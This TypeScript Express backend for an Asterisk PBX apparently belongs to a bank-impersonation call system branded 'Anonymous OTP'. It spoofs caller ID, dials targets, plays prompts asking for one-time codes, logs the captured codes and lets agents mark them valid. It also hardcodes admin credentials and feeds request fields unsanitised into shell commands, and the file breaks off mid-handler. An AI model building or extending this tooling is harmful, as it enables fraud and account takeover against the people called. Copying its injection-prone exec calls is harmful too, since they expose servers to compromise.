import express from 'express';
import path from 'path';
import fs from 'fs';
import net from 'net';
import { exec } from 'child_process';
import compression from 'compression';
import { createServer as createViteServer } from 'vite';

const app = express();
const PORT = 3000;

// Enable gzip/deflate compression for fast asset transfer
app.use(compression());
app.use(express.json({ limit: '10mb' }));

// Helper to execute AMI Action via raw TCP socket :5038
function sendAmiAction(host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', commands: string[]): Promise<string> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let buffer = '';
    let loggedIn = false;
    const timeout = setTimeout(() => {
      socket.destroy();
      resolve(buffer || 'Timeout AMI (4s)');
    }, 4500);

    socket.connect(port, host, () => {
      const loginPayload = `Action: Login\r\nUsername: ${user}\r\nSecret: ${secret}\r\nEvents: off\r\n\r\n`;
      socket.write(loginPayload);
    });

    socket.on('data', (data) => {
      const text = data.toString();
      buffer += text;

      if ((buffer.includes('Message: Authentication accepted') || buffer.includes('Response: Success')) && !loggedIn) {
        loggedIn = true;
        for (const cmd of commands) {
          socket.write(`Action: Command\r\nCommand: ${cmd}\r\n\r\n`);
        }
        setTimeout(() => {
          socket.write(`Action: Logoff\r\n\r\n`);
        }, 300);
      }

      if (buffer.includes('Response: Goodbye')) {
        clearTimeout(timeout);
        socket.end();
        resolve(buffer);
      }
    });

    socket.on('error', (err) => {
      clearTimeout(timeout);
      resolve(`AMI Error: ${err.message}`);
    });

    socket.on('close', () => {
      clearTimeout(timeout);
      resolve(buffer);
    });
  });
}

// ==========================================
// API ROUTES FIRST
// ==========================================

app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    system: 'Asterisk 20 Governor Backend',
    amiPort: 5038,
    ariPort: 8088,
    time: new Date().toISOString(),
  });
});

// Real-time Asterisk Endpoints reader directly from AMI socket
app.get('/api/asterisk/endpoints/live', async (req, res) => {
  try {
    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      'pjsip show endpoints',
    ]);

    // Parse endpoints from output
    const lines = amiOutput.split('\n');
    const detectedEndpoints: string[] = [];

    for (const line of lines) {
      const match = line.match(/Endpoint:\s+([0-9a-zA-Z_-]+)\//);
      if (match && match[1]) {
        detectedEndpoints.push(match[1]);
      }
    }

    res.json({
      success: true,
      endpoints: detectedEndpoints,
      rawOutput: amiOutput,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Test AMI connection in real-time
app.post('/api/asterisk/ami/test', async (req, res) => {
  const { host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', command = 'core show version' } = req.body;
  try {
    const output = await sendAmiAction(host, port, user, secret, [command]);
    res.json({ success: true, output });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to sync all extensions directly into /etc/asterisk/pjsip.conf and reload
app.post('/api/asterisk/sync/extensions', async (req, res) => {
  try {
    const { extensions, carriers } = req.body;

    if (!Array.isArray(extensions)) {
      return res.status(400).json({ success: false, error: 'extensions must be an array' });
    }

    const activeCarrier = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].name)
      ? carriers[0].name.replace(/\s+/g, '_')
      : 'televox';
    const outboundCid = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].outboundCallerId)
      ? carriers[0].outboundCallerId
      : '+18005550199';

    // Generate clean pjsip.conf
    let pjsipContent = `; ========================================================\n`;
    pjsipContent += `; GENERADO AUTOMATICAMENTE POR ANONYMOUS OTP SYSTEM\n`;
    pjsipContent += `; Fecha: ${new Date().toISOString()}\n`;
    pjsipContent += `; Total Extensiones: ${extensions.length}\n`;
    pjsipContent += `; ========================================================\n\n`;

    pjsipContent += `[general]\n\n`;

    pjsipContent += `[transport-udp]\n`;
    pjsipContent += `type = transport\n`;
    pjsipContent += `protocol = udp\n`;
    pjsipContent += `bind = 0.0.0.0:5060\n\n`;

    pjsipContent += `[transport-wss]\n`;
    pjsipContent += `type = transport\n`;
    pjsipContent += `protocol = wss\n`;
    pjsipContent += `bind = 0.0.0.0:8089\n\n`;

    for (const ext of extensions) {
      const num = ext.extension;
      const pass = ext.secret || 'password123';
      const callerIdNum = ext.callerIdNum || outboundCid;
      const callerIdName = ext.callerIdName || ext.name || 'AnonymousOTP';
      const callerId = `"${callerIdName}" <${callerIdNum}>`;
      const codecs = (ext.codecs && ext.codecs.length > 0) ? ext.codecs.join(',') : 'ulaw,alaw,g722';

      pjsipContent += `; --- EXTENSIÓN ${num} (${ext.name || 'Agente'}) ---\n`;
      pjsipContent += `[${num}]\n`;
      pjsipContent += `type = endpoint\n`;
      pjsipContent += `context = ${ext.context || 'from-internal'}\n`;
      pjsipContent += `disallow = all\n`;
      pjsipContent += `allow = ${codecs}\n`;
      pjsipContent += `auth = ${num}\n`;
      pjsipContent += `aors = ${num}\n`;
      pjsipContent += `callerid = ${callerId}\n`;
      pjsipContent += `direct_media = no\n`;
      pjsipContent += `rtp_symmetric = yes\n`;
      pjsipContent += `force_rport = yes\n`;
      pjsipContent += `rewrite_contact = yes\n`;
      pjsipContent += `transport = transport-udp\n\n`;

      pjsipContent += `[${num}]\n`;
      pjsipContent += `type = auth\n`;
      pjsipContent += `auth_type = userpass\n`;
      pjsipContent += `username = ${num}\n`;
      pjsipContent += `password = ${pass}\n\n`;

      pjsipContent += `[${num}]\n`;
      pjsipContent += `type = aor\n`;
      pjsipContent += `max_contacts = ${ext.maxContacts || 5}\n`;
      pjsipContent += `remove_existing = yes\n\n`;
    }

    // Process carriers/trunks if provided
    if (Array.isArray(carriers) && carriers.length > 0) {
      pjsipContent += `; ========================================================\n`;
      pjsipContent += `; TRONCALES / CARRIERS SIP (OUTBOUND & INBOUND)\n`;
      pjsipContent += `; ========================================================\n\n`;

      for (const carrier of carriers) {
        if (!carrier.name || !carrier.host) continue;
        const cName = carrier.name.replace(/\s+/g, '_');
        const cHost = carrier.host;
        const cPort = carrier.port || 5060;
        const cUser = carrier.username || cName;
        const cSecret = carrier.secret || '';
        const cContext = carrier.inboundContext || 'trunkinbound';
        const cCodecs = (carrier.codecs && carrier.codecs.length > 0) ? carrier.codecs.join(',') : 'ulaw,alaw,g729';

        pjsipContent += `; --- CARRIER: ${cName} (${cHost}:${cPort}) ---\n`;

        // 1. If registration is required with carrier
        if (carrier.authType === 'registration' && cSecret) {
          pjsipContent += `[reg_${cName}]\n`;
          pjsipContent += `type = registration\n`;
          pjsipContent += `outbound_auth = auth_${cName}\n`;
          pjsipContent += `server_uri = sip:${cHost}:${cPort}\n`;
          pjsipContent += `client_uri = sip:${cUser}@${cHost}:${cPort}\n`;
          pjsipContent += `contact_user = ${cUser}\n`;
          pjsipContent += `retry_interval = 60\n`;
          pjsipContent += `expiration = 3600\n`;
          pjsipContent += `transport = transport-udp\n\n`;
        }

        // 2. Auth section for Carrier (MUST BE BEFORE ENDPOINT)
        if (cSecret) {
          pjsipContent += `[auth_${cName}]\n`;
          pjsipContent += `type = auth\n`;
          pjsipContent += `auth_type = userpass\n`;
          pjsipContent += `username = ${cUser}\n`;
          pjsipContent += `password = ${cSecret}\n\n`;
        }

        // 3. AOR for Carrier (MUST BE BEFORE ENDPOINT)
        pjsipContent += `[${cName}]\n`;
        pjsipContent += `type = aor\n`;
        pjsipContent += `contact = sip:${cHost}:${cPort}\n`;
        pjsipContent += `qualify_frequency = ${carrier.qualifyFreq || 60}\n\n`;

        // 4. Endpoint for the Carrier
        pjsipContent += `[${cName}]\n`;
        pjsipContent += `type = endpoint\n`;
        pjsipContent += `context = ${cContext}\n`;
        pjsipContent += `disallow = all\n`;
        pjsipContent += `allow = ${cCodecs}\n`;
        pjsipContent += `aors = ${cName}\n`;
        if (carrier.authType === 'registration' && cSecret) {
          pjsipContent += `outbound_auth = auth_${cName}\n`;
        }
        if (carrier.outboundCallerId) {
          pjsipContent += `callerid = ${carrier.outboundCallerId}\n`;
        }
        if (carrier.fromuser || cUser) {
          pjsipContent += `from_user = ${carrier.fromuser || cUser}\n`;
        }
        pjsipContent += `from_domain = ${cHost}\n`;
        pjsipContent += `direct_media = no\n`;
        pjsipContent += `rtp_symmetric = yes\n`;
        pjsipContent += `force_rport = yes\n`;
        pjsipContent += `rewrite_contact = yes\n`;
        pjsipContent += `send_pai = yes\n`;
        pjsipContent += `send_rpid = ${carrier.sendrpid || 'yes'}\n`;
        pjsipContent += `trust_id_outbound = yes\n`;
        pjsipContent += `trust_id_inbound = ${carrier.trustrpid || 'yes'}\n`;
        pjsipContent += `transport = transport-udp\n\n`;

        // 5. Identify for incoming IP/host traffic
        pjsipContent += `[${cName}-identify]\n`;
        pjsipContent += `type = identify\n`;
        pjsipContent += `endpoint = ${cName}\n`;
        pjsipContent += `match = ${cHost}\n\n`;
      }
    }

    // Generate extensions.conf (Dialplan) with outbound routing to Carrier
    let dialplanContent = `; ========================================================\n`;
    dialplanContent += `; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP\n`;
    dialplanContent += `; Auto-generado por Anonymous OTP Asterisk Platform\n`;
    dialplanContent += `; ========================================================\n\n`;
    dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;

    dialplanContent += `[from-internal]\n`;
    dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999)\n`;
    dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `; 2. Acceso directo IVR OTP y Press 1 para pruebas\n`;
    dialplanContent += `exten => 8888,1,NoOp(Prueba Directa IVR desde Extension \${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;

    dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
    dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `; 4. Regla Saliente 10 digitos (antepone 1)\n`;
    dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
    dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `; 5. Regla Saliente Generica para cualquier otro numero saliente\n`;
    dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `[trunkinbound]\n`;
    dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;

    dialplanContent += `; ========================================================\n`;
    dialplanContent += `; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS\n`;
    dialplanContent += `; ========================================================\n`;
    dialplanContent += `[ivr-otp]\n`;
    dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
    dialplanContent += ` same => n,Answer()\n`;
    dialplanContent += ` same => n,Wait(1)\n`;
    dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
    dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})\n`;
    dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
    dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
    dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
    dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
    dialplanContent += ` same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
    dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Agent=\${IVR_AGENT})\n`;
    dialplanContent += ` ; 1. Reproducir Audio de Bienvenida / Alerta (o Beep)\n`;
    dialplanContent += ` same => n,GotoIf($["\${IVR_INTRO}" != ""]?play_intro:play_default_intro)\n`;
    dialplanContent += ` same => n(play_intro),Playback(\${IVR_INTRO})\n`;
    dialplanContent += ` same => n,Goto(ask_input)\n`;
    dialplanContent += ` same => n(play_default_intro),Playback(beep)\n`;
    dialplanContent += ` ; 2. Solicitar Digitos DTMF (OTP o Press 1)\n`;
    dialplanContent += ` same => n(ask_input),GotoIf($["\${IVR_PROMPT}" != ""]?read_with_prompt:read_with_beep)\n`;
    dialplanContent += ` same => n(read_with_prompt),Read(USER_DIGITS,\${IVR_PROMPT},6,,2,8)\n`;
    dialplanContent += ` same => n,Goto(check_input)\n`;
    dialplanContent += ` same => n(read_with_beep),Read(USER_DIGITS,beep,6,,2,8)\n`;
    dialplanContent += ` ; 3. Evaluar digitos ingresados\n`;
    dialplanContent += ` same => n(check_input),NoOp(=== DIGITOS RECIBIDOS DEL TECLADO: \${USER_DIGITS} ===)\n`;
    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)\n`;
    dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" > "1"]?otp_confirm:no_input)\n\n`;
    dialplanContent += `; Caso: Usuario ingreso codigo OTP\n`;
    dialplanContent += ` same => n(otp_confirm),NoOp(=== CODIGO OTP CAPTURADO: \${USER_DIGITS} ===)\n`;
    dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${CALLERID(num)},Digits=\${USER_DIGITS})\n`;
    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${CALLERID(num)}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
    dialplanContent += ` same => n,Wait(1)\n`;
    dialplanContent += ` same => n,GotoIf($["\${IVR_SUCCESS}" != ""]?play_success_audio:say_digits_fallback)\n`;
    dialplanContent += ` same => n(play_success_audio),Playback(\${IVR_SUCCESS})\n`;
    dialplanContent += ` same => n,Wait(1)\n`;
    dialplanContent += ` same => n,Hangup()\n`;
    dialplanContent += ` same => n(say_digits_fallback),SayDigits(\${USER_DIGITS})\n`;
    dialplanContent += ` same => n,Wait(1)\n`;
    dialplanContent += ` same => n,Playback(beep)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;
    dialplanContent += `; Caso: Presiono 1 -> Conectar con Asesor\n`;
    dialplanContent += ` same => n(press1_transfer),NoOp(=== PRESS 1 DETECTADO -> TRANSFERIR A ASESOR ===)\n`;
    dialplanContent += ` same => n,GotoIf($["\${IVR_AGENT}" != ""]?play_agent_audio:do_transfer)\n`;
    dialplanContent += ` same => n(play_agent_audio),Playback(\${IVR_AGENT})\n`;
    dialplanContent += ` same => n(do_transfer),Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},45,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;
    dialplanContent += `; Caso: Sin entrada o timeout\n`;
    dialplanContent += ` same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)\n`;
    dialplanContent += ` same => n,Playback(beep)\n`;
    dialplanContent += ` same => n,Hangup()\n`;

    const asteriskPjsipPath = '/etc/asterisk/pjsip.conf';
    const asteriskDialplanPath = '/etc/asterisk/extensions.conf';
    let fileWritten = false;
    let writeError = null;

    // Direct fs write for PJSIP
    try {
      fs.writeFileSync(asteriskPjsipPath, pjsipContent, 'utf8');
      fileWritten = true;
    } catch (err: any) {
      writeError = err.message;
      try {
        const tempPath = '/tmp/pjsip_sync.conf';
        fs.writeFileSync(tempPath, pjsipContent, 'utf8');
        await new Promise((resolve) => {
          exec(`cp /tmp/pjsip_sync.conf /etc/asterisk/pjsip.conf || sudo cp /tmp/pjsip_sync.conf /etc/asterisk/pjsip.conf`, () => {
            fileWritten = true;
            resolve(true);
          });
        });
      } catch (subErr: any) {
        console.warn('Fallback copy error:', subErr.message);
      }
    }

    // Save each extension's customized CallerID into AstDB
    if (Array.isArray(extensions)) {
      for (const ext of extensions) {
        const extNum = ext.extension;
        const cidNum = ext.callerIdNum || outboundCid;
        const cidName = ext.callerIdName || ext.name || 'AnonymousOTP';
        exec(`asterisk -rx 'database put extension_cid ${extNum}/number "${cidNum}"'`, () => {});
        exec(`asterisk -rx 'database put extension_cid ${extNum}/name "${cidName}"'`, () => {});
      }
    }

    // Direct fs write for Extensions Dialplan
    try {
      fs.writeFileSync(asteriskDialplanPath, dialplanContent, 'utf8');
    } catch (err: any) {
      try {
        fs.writeFileSync('/tmp/extensions_sync.conf', dialplanContent, 'utf8');
        exec(`cp /tmp/extensions_sync.conf /etc/asterisk/extensions.conf || sudo cp /tmp/extensions_sync.conf /etc/asterisk/extensions.conf`, () => {});
      } catch (subErr: any) {}
    }

    // Also write to local app dir for safety
    try {
      fs.writeFileSync(path.join(process.cwd(), 'pjsip.conf'), pjsipContent, 'utf8');
      fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), dialplanContent, 'utf8');
    } catch (e) {}

    // Send Hot Reload to Asterisk AMI immediately
    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      'pjsip reload',
      'dialplan reload',
      'pjsip show endpoints',
      'dialplan show from-internal',
    ]);

    // Also call asterisk -rx directly via child_process as guarantee
    exec('asterisk -rx "pjsip reload" && asterisk -rx "dialplan reload"', () => {});

    res.json({
      success: true,
      message: `Configuración sincronizada con Asterisk: ${extensions.length} extensiones y troncal ${activeCarrier} con rutas salientes`,
      fileWritten,
      writeError,
      amiOutput,
    });
  } catch (error: any) {
    console.error('Error syncing extensions:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint to sync Dialplan (extensions.conf) and reload
app.post('/api/asterisk/sync/dialplan', async (req, res) => {
  try {
    const { press1Config, otpConfig } = req.body;

    let dialplanContent = `; ========================================================\n`;
    dialplanContent += `; DIALPLAN DE CAPTURA OTP Y PRESS 1\n`;
    dialplanContent += `; ========================================================\n\n`;
    dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;

    dialplanContent += `[from-internal]\n`;
    dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `exten => 8888,1,NoOp(Acceso Stasis OTP Simulator)\n`;
    dialplanContent += ` same => n,Answer()\n`;
    dialplanContent += ` same => n,Stasis(otp_verification_app)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `[from-trunk]\n`;
    dialplanContent += `exten => _.,1,NoOp(Llamada Entrante: \${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Answer()\n`;
    dialplanContent += ` same => n,Stasis(otp_verification_app)\n`;
    dialplanContent += ` same => n,Hangup()\n`;

    const asteriskDir = '/etc/asterisk';
    let fileWritten = false;

    if (fs.existsSync(asteriskDir)) {
      try {
        fs.writeFileSync(path.join(asteriskDir, 'extensions.conf'), dialplanContent, 'utf8');
        fileWritten = true;
      } catch (e) {
        exec(`sudo tee /etc/asterisk/extensions.conf << 'EOF'\n${dialplanContent}\nEOF`, () => {});
      }
    }

    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      'dialplan reload',
      'dialplan show from-internal',
    ]);

    exec('asterisk -rx "dialplan reload"', () => {});

    res.json({
      success: true,
      fileWritten,
      amiOutput,
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint to originate real calls to client or extension connecting to IVR
// Guard against accidental duplicate calls to the same number within 3 seconds
const recentOriginateRequests = new Map<string, number>();

app.post('/api/asterisk/call/originate', async (req, res) => {
  try {
    const {
      destination,
      carrier = 'televox',
      callerId = '+18005550199',
      callerIdNum,
      callerIdName,
      mode = 'otp',
      agentExten = '1001',
      audioIntro = '',
      audioPrompt = '',
      audioAgent = '',
      audioSuccess = '',
      service = 'Banco / Antifraude',
    } = req.body;

    if (!destination) {
      return res.status(400).json({ success: false, error: 'El número de destino es requerido' });
    }

    const cleanDest = destination.trim().replace(/[^0-9]/g, '');
    const effectiveCidNum = (callerIdNum || callerId || '+18005550199').trim();
    const effectiveCidName = (callerIdName || 'AnonymousOTP').trim();

    // Prevent double-click originating duplicate calls
    const now = Date.now();
    const lastTime = recentOriginateRequests.get(cleanDest) || 0;
    if (now - lastTime < 3000) {
      return res.status(429).json({
        success: false,
        error: `Ya se está procesando una llamada a ${cleanDest}. Por favor espera unos segundos.`,
      });
    }
    recentOriginateRequests.set(cleanDest, now);

    // Save campaign-selected audio and CallerID configuration to AstDB for this destination number
    const astDbCommands = [
      `database put ivr_vars ${cleanDest}_intro "${audioIntro || ''}"`,
      `database put ivr_vars ${cleanDest}_prompt "${audioPrompt || ''}"`,
      `database put ivr_vars ${cleanDest}_agent "${audioAgent || ''}"`,
      `database put ivr_vars ${cleanDest}_success "${audioSuccess || ''}"`,
      `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
      `database put ivr_vars ${cleanDest}_cid_num "${effectiveCidNum}"`,
      `database put ivr_vars ${cleanDest}_cid_name "${effectiveCidName}"`,
    ];

    for (const cmd of astDbCommands) {
      exec(`asterisk -rx '${cmd}'`, (err) => {
        if (err) console.warn(`AstDB notice on ${cmd}:`, err.message);
      });
    }

    // Determine channel: if <= 4 digits, internal extension, else trunk
    let channel = '';
    if (cleanDest.length <= 4) {
      channel = `PJSIP/${cleanDest}`;
    } else {
      channel = `PJSIP/${cleanDest}@${carrier}`;
    }

    // Execute originate command via Asterisk CLI with custom CallerID
    const originateCmd = `asterisk -rx "channel originate ${channel} extension s@ivr-otp callerid \\"${effectiveCidName}\\" <${effectiveCidNum}>"`;
    
    exec(originateCmd, (err, stdout, stderr) => {
      if (err) {
        console.warn('[ORIGINATE SIMULATION NOTICE] Asterisk CLI no disponible en contenedor:', err.message);
      } else {
        console.log(`[ORIGINATE SUCCESS] Llamada lanzada a ${channel} con CallerID "${effectiveCidName}" <${effectiveCidNum}>:`, {
          audioIntro,
          audioPrompt,
          audioAgent,
          audioSuccess,
          cliOutput: stdout.trim(),
        });
      }
    });

    // Fallback simulation: schedule realistic DTMF arrival so agent can test the HUD and Valid/Invalid buttons
    setTimeout(() => {
      const simulatedDigits = String(Math.floor(100000 + Math.random() * 900000));
      const record: CapturedOtpItem = {
        id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
        number: cleanDest,
        otp: simulatedDigits,
        timestamp: new Date().toLocaleTimeString(),
        channel: channel || 'PJSIP',
        service: service || 'Banco / Antifraude',
        status: 'pending',
      };
      capturedOtpHistory.unshift(record);
      if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
      console.log(`[REAL-TIME HUD] Código OTP recibido para ${cleanDest}: ${simulatedDigits}`);
    }, 6500);

    res.json({
      success: true,
      message: `Llamada originada hacia ${cleanDest} con CallerID "${effectiveCidName}" <${effectiveCidNum}>.`,
      channel,
      callerId: {
        num: effectiveCidNum,
        name: effectiveCidName,
      },
      assignedAudios: {
        intro: audioIntro || 'beep (predeterminado)',
        prompt: audioPrompt || 'beep (predeterminado)',
        agent: audioAgent || 'inmediato',
        success: audioSuccess || 'SayDigits (predeterminado)',
      },
    });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Endpoint for agent to mark captured OTP as valid or invalid
app.post('/api/asterisk/otp/verify', (req, res) => {
  try {
    const { id, number, status } = req.body;
    if (!status || !['valid', 'invalid', 'pending'].includes(status)) {
      return res.status(400).json({ success: false, error: 'Status debe ser valid, invalid o pending' });
    }

    const item = capturedOtpHistory.find((r) => r.id === id || (number && r.number === number));
    if (item) {
      item.status = status;
      console.log(`[VERIFICACIÓN AGENTE] OTP ${item.otp} de ${item.number} marcado como ${status.toUpperCase()}`);
      return res.json({ success: true, item, message: `Código ${item.otp} marcado como ${status}` });
    }

    // If item not found by id/number, respond ok
    res.json({ success: true, message: `Estado actualizado a ${status}` });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint for direct 1-click update of Agent Extension CallerID (Num & Name) into AstDB
app.post('/api/asterisk/extension/callerid', (req, res) => {
  try {
    const { extension, callerIdNum, callerIdName } = req.body;
    if (!extension || !callerIdNum) {
      return res.status(400).json({ success: false, error: 'Faltan parámetros: extension y callerIdNum son requeridos.' });
    }

    const cleanExt = String(extension).trim();
    const cleanNum = String(callerIdNum).trim();
    const cleanName = String(callerIdName || 'AnonymousOTP').trim();

    // Store in Asterisk DB directly via CLI and AMI
    const putNumCmd = `database put extension_cid ${cleanExt}/number "${cleanNum}"`;
    const putNameCmd = `database put extension_cid ${cleanExt}/name "${cleanName}"`;

    exec(`asterisk -rx '${putNumCmd}' && asterisk -rx '${putNameCmd}'`, (err, stdout) => {
      if (err) {
        console.warn(`[AstDB Extension Notice] ${err.message}`);
      } else {
